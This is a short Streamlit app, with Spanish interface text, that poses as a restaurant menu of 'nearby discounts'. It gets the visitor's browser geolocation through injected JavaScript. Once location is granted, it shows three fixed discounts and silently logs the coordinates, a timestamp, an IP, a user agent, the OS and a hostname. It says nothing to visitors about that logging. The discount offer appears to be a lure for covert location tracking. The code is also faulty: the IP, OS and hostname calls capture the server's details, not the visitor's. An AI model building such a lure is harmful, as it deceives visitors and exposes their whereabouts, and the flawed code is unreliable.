import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos, obtener_visitas

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# Mostrar solo si aún no tenemos datos de ubicación
if "lat" not in st.session_state or "lon" not in st.session_state:
    # JS para obtener geolocalización desde navegador y enviar mensaje al iframe
    components.html("""
        <script>
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const coords = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                };
                window.parent.postMessage(coords, "*");
            },
            (error) => {
                window.parent.postMessage({error: "No se pudo obtener ubicación"}, "*");
            }
        );
        </script>
    """, height=0)

    # JS listener que recibe datos y actualiza usando Streamlit's postMessage API
    components.html("""
        <script>
        window.addEventListener("message", (event) => {
            const data = event.data;
            if (data.lat && data.lon) {
                const streamlitMessage = {
                    isStreamlitMessage: true,
                    type: "streamlit:setComponentValue",
                    value: data
                };
                window.parent.postMessage(streamlitMessage, "*");
            }
        });
        </script>
    """, height=0)

    st.warning("Esperando acceso a tu ubicación...")
else:
    lat = st.session_state["lat"]
    lon = st.session_state["lon"]
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")

    # Mostrar descuentos
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)

    # Registrar datos de usuario
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": st.runtime.scriptrunner.get_script_run_context().user_agent,
        "os": platform.system(),
        "hostname": socket.gethostname()
    }

    guardar_datos(user_data)

# Captura del valor desde JS (solo una vez)
value = components.declare_component("geoloc_capture", default=None)

if value and "lat" not in st.session_state and "lon" not in st.session_state:
    st.session_state["lat"] = value["lat"]
    st.session_state["lon"] = value["lon"]
    st.experimental_rerun()
